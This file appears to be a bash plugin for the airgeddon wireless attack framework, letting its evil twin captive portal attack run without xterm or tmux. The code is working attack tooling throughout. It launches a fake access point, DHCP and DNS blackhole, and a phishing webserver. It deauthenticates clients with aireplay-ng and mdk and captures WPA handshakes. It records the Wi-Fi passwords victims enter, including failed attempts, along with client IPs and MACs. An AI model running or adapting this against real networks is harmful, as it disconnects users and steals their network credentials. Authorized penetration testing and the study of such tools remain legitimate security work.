#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

###### GENERIC PLUGIN VARS ######

plugin_name="No Gui"
plugin_description="Implement evil twin with captive portal attack without the need for xterm or tmux"
plugin_author="xpz3"

#Enabled 1 / Disabled 0 - Set this plugin as enabled - Default value 1
plugin_enabled=1

###### PLUGIN REQUIREMENTS ######

#Set airgeddon versions to apply this plugin (leave blank to set no limits, minimum version recommended is 10.0 on which plugins feature was added)
plugin_minimum_ag_affected_version="10.0"
plugin_maximum_ag_affected_version=""

#Set only one element in the array "*" to affect all distros, otherwise add them one by one with the name which airgeddon uses for that distro (examples "BlackArch", "Parrot", "Kali")
plugin_distros_supported=("*")

#Nogui Globals
#AIRGEDDON_WINDOWS_HANDLING="nogui"

#Color Variables
	nogui_normal_color="\e[0;0m"
	nogui_green_color="\033[0;32m"
	nogui_red_color="\033[0;031m"
	nogui_blue_color="\033[0;34m"
	nogui_cyan_color="\033[0;36m"
	nogui_brown_color="\033[0;33m"
	nogui_yellow_color="\033[0;33m"
	nogui_pink_color="\033[0;35m"
	nogui_white_color="\e[1;97m"

function add_color() {

	case "${1}" in
		 "/tmp/nogui-AP.log")
			tail_color="${nogui_green_color}"
		;;
		"/tmp/nogui-DHCP.log")
			tail_color="${nogui_brown_color}"
		;;
		"/tmp/nogui-Deauth.log")
			tail_color="${nogui_red_color}"
		;;
		"/tmp/nogui-DNS.log")
			tail_color="${nogui_blue_color}"
		;;
		"/tmp/nogui-Webserver.log")
			tail_color="${nogui_yellow_color}"
		;;
	esac
}

function nogui_kill_processes() {

	debug_print
	
	for item in "${nogui_processes[@]}"; do
		kill "${item}" &> /dev/null
	done
}

function nogui_posthook_kill_et_windows() {

	debug_print
	
	nogui_kill_processes
}

function nogui_override_manage_output() {

	debug_print

	local xterm_parameters
	local tmux_command_line
	local xterm_command_line
	local window_name
	local command_tail

	xterm_parameters="${1}"
	tmux_command_line="${2}"
	xterm_command_line="\"${2}\""
	window_name="${3}"
	command_tail=" > /dev/null 2>&1 &"
	
	nogui_command_line="${2}"
	nogui_command_tail=" > \"/tmp/nogui-${window_name}.log\" 2>&1 &"
	nogui_bgonly_command_tail=" &"
	#echo "${xterm_command_line}===${command_tail}"

	nogui_windows_start=0
	nogui_skip_trap=0
	no_pid=1 #Skip process id capture

	case "${window_name}" in
		 "AP" | "DHCP" | "DNS" | "Deauth" | "Webserver")
			nogui_windows_start=1
			nogui_filelist+=("/tmp/nogui-${window_name}.log")
			eval "${nogui_command_line}${nogui_command_tail}"
		;;
		"Control")
			nogui_windows_start=1
			nogui_filelist+=("/tmp/nogui-${window_name}.log")
			eval "${nogui_command_line}${nogui_bgonly_command_tail}"
		;;
		"Exploring for targets" | "Capturing Handshake")
			nogui_windows_start=1
			nogui_skip_trap=1
			eval "${nogui_command_line}"
			no_pid=0
		;;
		"${mdk_command} amok attack" | "aireplay deauth attack" | "wids / wips / wds confusion attack")
			nogui_windows_start=1
			nogui_skip_trap=1
			eval "${nogui_command_line}${command_tail}"
		;;
	esac

	if [ "${no_pid}" -eq 1 ]; then
		if [ -z "${nogui_processes}" ]; then
			nogui_processes=$!
		else
			nogui_processes+=($!)
		fi
	fi

	if [ "${nogui_windows_start}" -eq 0 ]; then
		case "${AIRGEDDON_WINDOWS_HANDLING}" in
		 "tmux")
			 local tmux_color
			 tmux_color=""
			 [[ "${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="${BASH_REMATCH[2]}"
			 case "${4}" in
				 "active")
					 start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}" "active"
				 ;;
				 *)
					 start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}"
				 ;;
			 esac
		 ;;
		 "xterm")
			 eval "xterm ${xterm_parameters} -e ${xterm_command_line}${command_tail}"
		 ;;
		esac
	fi
}

function nogui_override_exec_et_captive_portal_attack() {

	debug_print
	
	rm -rf /tmp/*.log
	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1

	echo
	language_strings "${language}" "nogui_text_1" "yellow"
	read

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_et_control_script
	launch_et_control_window
	launch_dns_blackhole
	set_webserver_config
	set_captive_portal_page
	launch_webserver
	write_et_processes
	
	declare -A nogui_line_index
	nogui_line_index["/tmp/nogui-AP.log"]=0
	nogui_line_index["/tmp/nogui-DHCP.log"]=0
	nogui_line_index["/tmp/nogui-DNS.log"]=0
	nogui_line_index["/tmp/nogui-Deauth.log"]=0
	nogui_line_index["/tmp/nogui-Webserver.log"]=0
	nogui_line_index["/tmp/nogui-Control.log"]=0

	nogui_et_running=1

	local nogui_log_prefix
	local nogui_header_counter=0

	while true; do
		for i in "${nogui_filelist[@]}"
		do
			:
				[[ "${i}" =~ ^/tmp/.*-(.*).log ]] && nogui_log_prefix="${BASH_REMATCH[1]}"
				j="${nogui_line_index[$i]}"
				
				linesToSkip="${j}"
				((linesToSkip-1))
				if [ -f "${i}" ];then
				{
					add_color "${i}"
					for ((k="$linesToSkip";k--;)) ;do
						read
						done
					while read nogui_line ;do
						if [ "${nogui_header_counter}" -eq 0 ]; then
							echo
							echo -e "${nogui_white_color}[${nogui_log_prefix}]"
						fi
						echo -e "$tail_color${nogui_line}"
						((j=j+1))
						((nogui_header_counter=nogui_header_counter+1))
					done
					nogui_header_counter=0
				} < "${i}"
				fi
				nogui_line_index["${i}"]="${j}"
		done
		sleep 1
	done
}

function nogui_override_capture_traps() {

	debug_print

	if [ "${FUNCNAME[1]}" != "check_language_strings" ]; then
		case "${1}" in
			INT|SIGTSTP)
				case ${current_menu} in
					"pre_main_menu"|"select_interface_menu")
						exit_code=1
						exit_script_option
					;;
					*)
						if [ "${nogui_skip_trap}" -eq 0 ]; then
							if [ "${nogui_et_running}" -eq 1 ]; then
									kill_et_windows

									if [ "${dos_pursuit_mode}" -eq 1 ]; then
										recover_current_channel
									fi
									restore_et_interface
									clean_tmpfiles
									nogui_et_running=0
									evil_twin_attacks_menu
							else
								ask_yesno 12 "yes"
								if [ "${yesno}" = "y" ]; then
										exit_code=1
										exit_script_option
								else
									language_strings "${language}" 224 "blue"
									if [ "${last_buffered_type1}" = "read" ]; then
										language_strings "${language}" "${last_buffered_message2}" "${last_buffered_type2}"
									else
										language_strings "${language}" "${last_buffered_message1}" "${last_buffered_type1}"
									fi
								fi
							fi
						else
							nogui_skip_trap=0
						fi
					;;
				esac
			;;
			SIGINT|SIGHUP)
				if [ "${no_hardcore_exit}" -eq 0 ]; then
					hardcore_exit
				else
					exit ${exit_code}
				fi
			;;
		esac
	else
		echo
		hardcore_exit
	fi
}

function evil_twin_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 253 "title"
	current_menu="evil_twin_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 255 "separator"
	language_strings "${language}" 256 et_onlyap_dependencies[@]
	language_strings "${language}" 257 "separator"
	language_strings "${language}" 259 et_sniffing_dependencies[@]
	language_strings "${language}" 261 et_sniffing_sslstrip2_dependencies[@]
	language_strings "${language}" 396
	language_strings "${language}" 262 "separator"
	language_strings "${language}" 263 et_captive_portal_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " et_option
	case ${et_option} in
		0)
			main_menu
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option
		;;
		5)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					et_mode="et_onlyap"
					et_dos_menu
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		6)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					et_mode="et_sniffing"
					et_dos_menu
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		7)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					et_mode="et_sniffing_sslstrip2"
					get_bettercap_version
					if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}" && ! compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_sslstrip_working_version}"; then
						echo
						language_strings "${language}" 174 "red"
						language_strings "${language}" 115 "read"
					else
						et_dos_menu
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			beef_pre_menu
		;;
		9)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					et_mode="et_captive_portal"
					echo
					language_strings "${language}" 316 "yellow"
					language_strings "${language}" 115 "read"

					if explore_for_targets_option "WPA"; then
						et_dos_menu
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	evil_twin_attacks_menu
}

function nogui_override_set_et_control_script() {

	debug_print

	rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1

	exec 7>"${tmpdir}${control_et_file}"

	cat >&7 <<-EOF
		#!/usr/bin/env bash
		et_heredoc_mode=${et_mode}
	EOF

	cat >&7 <<-'EOF'
		if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
	EOF

	cat >&7 <<-EOF
			path_to_processes="${tmpdir}${webdir}${et_processesfile}"
			attempts_path="${tmpdir}${webdir}${attemptsfile}"
			attempts_text="${blue_color}${et_misc_texts[${language},20]}:${normal_color}"
			last_password_msg="${blue_color}${et_misc_texts[${language},21]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
			function kill_et_windows() {

				readarray -t ET_PROCESSES_TO_KILL < <(cat < "${path_to_processes}" 2> /dev/null)
				for item in "${ET_PROCESSES_TO_KILL[@]}"; do
					kill "${item}" &> /dev/null
				done
			}
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
			function kill_tmux_windows() {

				local TMUX_WINDOWS_LIST=()
				local current_window_name
				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
						continue
					fi
					if [ -n "\${1}" ]; then
						if [ "\${current_window_name}" = "\${1}" ]; then
							continue
						fi
					fi
					tmux kill-window -t "${session_name}:\${current_window_name}"
				done
			}
		EOF
	fi

	cat >&7 <<-EOF
			function finish_evil_twin() {
	EOF
	
	cat >&7 <<-'EOF'
				kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C dnsmasq --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill_et_windows
				rm -rf /tmp/*.log
	EOF
	
	cat >&7 <<-EOF
				echo "" > "${et_captive_portal_logpath}"
	EOF

	cat >&7 <<-'EOF'
				date +%Y-%m-%d >>\
	EOF

	cat >&7 <<-EOF
				"${et_captive_portal_logpath}"
				{
				echo "${et_misc_texts[${language},19]}"
				echo ""
				echo "BSSID: ${bssid}"
				echo "${et_misc_texts[${language},1]}: ${channel}"
				echo "ESSID: ${essid}"
				echo ""
				echo "---------------"
				echo ""
				} >> "${et_captive_portal_logpath}"
				success_pass_path="${tmpdir}${webdir}${currentpassfile}"
				msg_good_pass="${et_misc_texts[${language},11]}:"
				log_path="${et_captive_portal_logpath}"
				log_reminder_msg="${pink_color}${et_misc_texts[${language},24]}: [${normal_color}${et_captive_portal_logpath}${pink_color}]${normal_color}"
				done_msg="${yellow_color}${arr[${language},"nogui_text_2"]}${normal_color}"
				echo -e "\t${blue_color}${et_misc_texts[${language},23]}:${normal_color}"
				echo
	EOF

	cat >&7 <<-'EOF'
				echo "${msg_good_pass} $( (cat < ${success_pass_path}) 2> /dev/null)" >> "${log_path}"
				attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
				et_password=$( (cat < ${success_pass_path}) 2> /dev/null)
				echo -e "\t${et_password}"
				echo
				echo -e "\t${log_reminder_msg}"
				echo
				echo -e "\t${done_msg}"
				if [ "${attempts_number}" -gt 0 ]; then
	EOF

	cat >&7 <<-EOF
					{
					echo ""
					echo "---------------"
					echo ""
					echo "${et_misc_texts[${language},22]}:"
					echo ""
					} >> "${et_captive_portal_logpath}"
					readarray -t BADPASSWORDS < <(cat < "${tmpdir}${webdir}${attemptsfile}" 2> /dev/null)
	EOF

	cat >&7 <<-'EOF'
					for badpass in "${BADPASSWORDS[@]}"; do
						echo "${badpass}" >>\
	EOF

	cat >&7 <<-EOF
						"${et_captive_portal_logpath}"
					done
				fi

				{
				echo ""
				echo "---------------"
				echo ""
				echo "${footer_texts[${language},0]}"
				} >> "${et_captive_portal_logpath}"

				sleep 2
	EOF


	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
				kill_tmux_windows "Control"
		EOF
	fi

	cat >&7 <<-EOF
				exit 0
			}
		fi
	EOF

	cat >&7 <<-'EOF'
		date_counter=$(date +%s)
		attempts_last_number=2
		attempts_last_number_g=2
		dhcp_clients_previous_count=0
		inc=0
		while true; do
		#echo "">"/tmp/nogui-Control.log"
	EOF

	case ${et_mode} in
		"et_onlyap")
			local control_msg=${et_misc_texts[${language},4]}
		;;
		"et_sniffing"|"et_sniffing_sslstrip2")
			local control_msg=${et_misc_texts[${language},5]}
		;;
		"et_sniffing_sslstrip2_beef")
			local control_msg=${et_misc_texts[${language},27]}
		;;
		"et_captive_portal")
			local control_msg=${et_misc_texts[${language},6]}
		;;
	esac

	cat >&7 <<-EOF
			if [ "${channel}" != "${et_channel}" ]; then
				et_control_window_channel="${et_channel} (5Ghz: ${channel})"
			else
				et_control_window_channel="${channel}"
			fi
	EOF

	cat >&7 <<-'EOF'
			if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
	EOF

	cat >&7 <<-EOF
				if [ -f "${tmpdir}${webdir}${et_successfile}" ]; then
					clear
	EOF

	cat >&7 <<-'EOF'
					finish_evil_twin
				else
					attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
					last_password=$(grep "." ${attempts_path} 2> /dev/null | tail -1)
					#tput el && echo -ne "\t${attempts_text} ${attempts_number}"
					if [ "${attempts_number}" != "${attempts_last_number}"  ]; then
						echo -ne "\t${attempts_text} ${attempts_number}">>/tmp/nogui-Control.log
						echo>>/tmp/nogui-Control.log
						attempts_last_number="${attempts_number}"
					fi
					if [[ "${attempts_number}" -gt 0 && "${attempts_number}" != "${attempts_last_number_g}" ]]; then
	EOF

	cat >&7 <<-EOF
						open_parenthesis="${yellow_color}(${normal_color}"
						close_parenthesis="${yellow_color})${normal_color}"
	EOF

	cat >&7 <<-'EOF'
						echo -ne " ${open_parenthesis} ${last_password_msg} ${last_password} ${close_parenthesis}">>/tmp/nogui-Control.log
						echo>>/tmp/nogui-Control.log
						attempts_last_number_g="${attempts_number}"
					fi
				fi
				#echo
				#echo
			fi
			if [ "${inc}" -eq 0 ]; then
	EOF

	cat >&7 <<-EOF
			echo -e "\t${green_color}${et_misc_texts[${language},3]}${normal_color}">>/tmp/nogui-Control.log
			((inc	=inc+1))
			fi
			readarray -t DHCPCLIENTS < <(grep DHCPACK < "${tmpdir}clts.txt")
			client_ips=()
	EOF

	cat >&7 <<-'EOF'
			if [[ -z "${DHCPCLIENTS[@]}" ]]; then
				if [ "${inc}" -eq 0 ]; then
	EOF

	cat >&7 <<-EOF
				echo -e "\t${et_misc_texts[${language},7]}">>/tmp/nogui-Control.log
				fi
			else
	EOF

	cat >&7 <<-'EOF'
				for client in "${DHCPCLIENTS[@]}"; do
					dhcp_clients_count="${#DHCPCLIENTS[@]}"
					[[ ${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="${BASH_REMATCH[1]}" && client_mac="${BASH_REMATCH[2]}"
					if [[ " ${client_ips[*]} " != *" ${client_ip} "* ]]; then
						client_hostname=""
						[[ ${client} =~ .*(\(.+\)).* ]] && client_hostname="${BASH_REMATCH[1]}"
						if [[ -z "${client_hostname}" ]]; then
							if [ "${dhcp_clients_count}" != "${dhcp_clients_previous_count}" ]; then
								echo -e "\t${client_ip} ${client_mac}">>/tmp/nogui-Control.log
								echo>>/tmp/nogui-Control.log
								((dhcp_clients_previous_count=dhcp_clients_count))
							fi
						else
							if [ "${dhcp_clients_count}" != "${dhcp_clients_previous_count}" ]; then
								echo -e "\t${client_ip} ${client_mac} ${client_hostname}">>/tmp/nogui-Control.log
								echo>>/tmp/nogui-Control.log
								((dhcp_clients_previous_count=dhcp_clients_count))
							fi
						fi
					fi
					client_ips+=(${client_ip})
				done
			fi
			#echo -ne "\033[K\033[u"
			sleep 0.3
			current_window_size="$(tput cols)x$(tput lines)"
			if [ "${current_window_size}" != "${stored_window_size}" ]; then
				stored_window_size="${current_window_size}"
				#clear
			fi
			sleep 1
		done
		sleep 1
	EOF

	exec 7>&-
	sleep 1
}

function nogui_override_wait_for_process() {

	debug_print

	return
}

function nogui_override_get_tmux_process_id() {

	debug_print

	return
}

function nogui_override_handshake_capture_check() {

	debug_print

	check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "silent" "only_handshake"
}

function nogui_override_capture_handshake_evil_twin() {

	debug_print

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi

	ask_timeout "capture_handshake"
	sleeptimeattack=10

	case ${et_dos_attack} in
		"${mdk_command}")
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "timeout -s SIGTERM ${sleeptimeattack} ${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
		;;
		"Aireplay")
			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "timeout -s SIGTERM ${sleeptimeattack} aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
		;;
		"Wds Confusion")
			recalculate_windows_sizes
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "timeout -s SIGTERM ${sleeptimeattack} ${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
		;;
	esac
	processidattack=$!
	capture_handshake_window

	handshake_capture_check

	if check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "showing_msgs_capturing" "also_pmkid"; then

		handshakepath="${default_save_path}"
		handshakefilename="handshake-${bssid}.cap"
		handshakepath="${handshakepath}${handshakefilename}"

		echo
		language_strings "${language}" 162 "yellow"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "writeethandshake"
		done

		cp "${tmpdir}${standardhandshake_filename}" "${et_handshake}"
		echo
		language_strings "${language}" 324 "blue"
		language_strings "${language}" 115 "read"
		return 0
	else
		echo
		language_strings "${language}" 146 "red"
		language_strings "${language}" 115 "read"
		return 2
	fi
}

function nogui_override_capture_handshake_window() {

	debug_print

	echo
	language_strings "${language}" 143 "blue"
	echo
	language_strings "${language}" 144 "yellow"
	language_strings "${language}" 115 "read"
	echo
	language_strings "${language}" 325 "blue"

	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
	recalculate_windows_sizes
	manage_output "+j -sb -rightbar -geometry ${g1_topright_window} -T \"Capturing Handshake\"" "timeout --foreground -s SIGTERM ${timeout_capture_handshake} airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}" "Capturing Handshake" "active"
}

function nogui_override_check_compatibility() {

	debug_print

	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
		echo
		language_strings "${language}" 108 "blue"
		language_strings "${language}" 115 "read"

		echo
		language_strings "${language}" 109 "blue"
	fi

	essential_toolsok=1
	for i in "${essential_tools_names[@]}"; do
		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			if [[ "${i}" == "xterm" || "${i}" == "tmux" ]]; then
				continue
			fi
			echo -ne "${i}"
			time_loop
			
			if ! hash "${i}" 2> /dev/null; then
				echo -ne "${red_color} Error${normal_color}"
				essential_toolsok=0
				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
				echo -e "\r"
			else
				echo -e "${green_color} Ok\r${normal_color}"
			fi
		else
			if ! hash "${i}" 2> /dev/null; then
				essential_toolsok=0
			fi
		fi
	done

	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
		echo
		language_strings "${language}" 218 "blue"
	fi

	optional_toolsok=1
	for i in "${!optional_tools[@]}"; do
		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo -ne "${i}"
			time_loop
		fi
		if ! hash "${i}" 2> /dev/null; then
			if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
				echo -ne "${red_color} Error${normal_color}"
				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
				echo -e "\r"
			fi
			optional_toolsok=0
		else
			if [ "${i}" = "beef" ]; then
				detect_fake_beef
				if [ ${fake_beef_found} -eq 1 ]; then
					if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
						echo -ne "${red_color} Error${normal_color}"
						echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
						echo -e "\r"
					fi
					optional_toolsok=0
				else
					if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
						echo -e "${green_color} Ok\r${normal_color}"
					fi
					optional_tools[${i}]=1
				fi
			else
				if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
					echo -e "${green_color} Ok\r${normal_color}"
				fi
				optional_tools[${i}]=1
			fi
		fi
	done

	update_toolsok=1
	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then

		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo
			language_strings "${language}" 226 "blue"
		fi

		for i in "${update_tools[@]}"; do
			if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
				echo -ne "${i}"
				time_loop
				if ! hash "${i}" 2> /dev/null; then
					echo -ne "${red_color} Error${normal_color}"
					update_toolsok=0
					echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
					echo -e "\r"
				else
					echo -e "${green_color} Ok\r${normal_color}"
				fi
			else
				if ! hash "${i}" 2> /dev/null; then
					update_toolsok=0
				fi
			fi
		done
	fi

	if [ ${essential_toolsok} -eq 0 ]; then
		echo
		language_strings "${language}" 111 "red"
		echo
		if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
			language_strings "${language}" 581 "blue"
			echo
		fi
		language_strings "${language}" 115 "read"
		return
	fi

	compatible=1

	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
		if [ ${optional_toolsok} -eq 0 ]; then
			echo
			language_strings "${language}" 219 "yellow"

			if [ ${fake_beef_found} -eq 1 ]; then
				echo
				language_strings "${language}" 401 "red"
				echo
			fi
			return
		fi

		echo
		language_strings "${language}" 110 "yellow"
	fi
}

function initialize_nogui_language_strings() {

	debug_print

	arr["ENGLISH",nogui_text_1]="The attack is going to start. Press Ctrl+C to stop the attack and return to menu. Press Enter to continue..."
	arr["SPANISH",nogui_text_1]="El ataque va a comenzar. Pulsa Ctrl+C para parar el ataque y volver al menú. Pulsa Enter para continuar..."
	arr["FRENCH",nogui_text_1]="\${pending_of_translation} L'attaque va commencer. Appuyez sur Ctrl+C pour arrêter l'attaque et revenir au menu. Appuyez sur Entrée pour continuer..."
	arr["CATALAN",nogui_text_1]="\${pending_of_translation} L'atac començarà. Premeu Ctrl+C per aturar l'atac i tornar al menú. Premeu Intro per continuar..."
	arr["PORTUGUESE",nogui_text_1]="\${pending_of_translation} O ataque vai começar. Pressione Ctrl+C para interromper o ataque e retornar ao menu. Pressione Enter para continuar..."
	arr["RUSSIAN",nogui_text_1]="\${pending_of_translation} Атака вот-вот начнется. Нажмите Ctrl+C, чтобы остановить атаку и вернуться в меню. Нажмите Enter, чтобы продолжить..."
	arr["GREEK",nogui_text_1]="\${pending_of_translation} Η επίθεση πρόκειται να ξεκινήσει. Πατήστε Ctrl+C για να σταματήσετε την επίθεση και να επιστρέψετε στο μενού. Πατήστε Enter για να συνεχίσετε..."
	arr["ITALIAN",nogui_text_1]="\${pending_of_translation} L'attacco sta per iniziare. Premi Ctrl+C per fermare l'attacco e tornare al menu. Premi Invio per continuare..."
	arr["POLISH",nogui_text_1]="\${pending_of_translation} Atak ma się rozpocząć. Naciśnij Ctrl+C, aby zatrzymać atak i wrócić do menu. Naciśnij Enter, aby kontynuować..."
	arr["GERMAN",nogui_text_1]="\${pending_of_translation} Der Angriff wird beginnen. Drücken Sie Ctrl+C, um den Angriff zu stoppen und zum Menü zurückzukehren. Drücken Sie die Eingabetaste, um fortzufahren ..."
	arr["TURKISH",nogui_text_1]="\${pending_of_translation} Saldırı başlayacak. Saldırıyı durdurmak ve menüye dönmek için Ctrl+C tuşlarına basın. Devam etmek için Enter'a basın..."
	arr["ARABIC",nogui_text_1]="\${pending_of_translation} ...الهجوم سيبدأ. اضغط على Ctrl+C لإيقاف الهجوم والعودة إلى القائمة. إضغط مفتاح الدخول للاستمرار"
	arr["CHINESE",nogui_text_1]="攻击就要开始了，按 Ctrl+C 停止攻击并返回菜单，按 Enter 继续..."
	
	arr["ENGLISH",nogui_text_2]="Press Ctrl+C to return to the menu..."
	arr["SPANISH",nogui_text_2]="Pulsa Ctrl+C para volver al menú..."
	arr["FRENCH",nogui_text_2]="\${pending_of_translation} Appuyez sur Ctrl+C pour revenir au menu..."
	arr["CATALAN",nogui_text_2]="\${pending_of_translation} Premeu Ctrl+C per tornar al menú..."
	arr["PORTUGUESE",nogui_text_2]="\${pending_of_translation} Pressione Ctrl+C para retornar ao menu..."
	arr["RUSSIAN",nogui_text_2]="\${pending_of_translation} Нажмите Ctrl+C, чтобы вернуться в меню..."
	arr["GREEK",nogui_text_2]="\${pending_of_translation} Πατήστε Ctrl+C για να επιστρέψετε στο μενού..."
	arr["ITALIAN",nogui_text_2]="\${pending_of_translation} Premi Ctrl+C per tornare al menu..."
	arr["POLISH",nogui_text_2]="\${pending_of_translation} Naciśnij Ctrl+C, aby wrócić do menu..."
	arr["GERMAN",nogui_text_2]="\${pending_of_translation} Drücken Sie Strg+C, um zum Menü zurückzukehren ..."
	arr["TURKISH",nogui_text_2]="\${pending_of_translation} Menüye dönmek için Ctrl+C tuşlarına basın..."
	arr["ARABIC",nogui_text_2]="\${pending_of_translation} ...اضغط على Ctrl+C للعودة إلى القائمة"
	arr["CHINESE",nogui_text_2]="按 Ctrl+C 返回菜单..."
}

initialize_nogui_language_strings
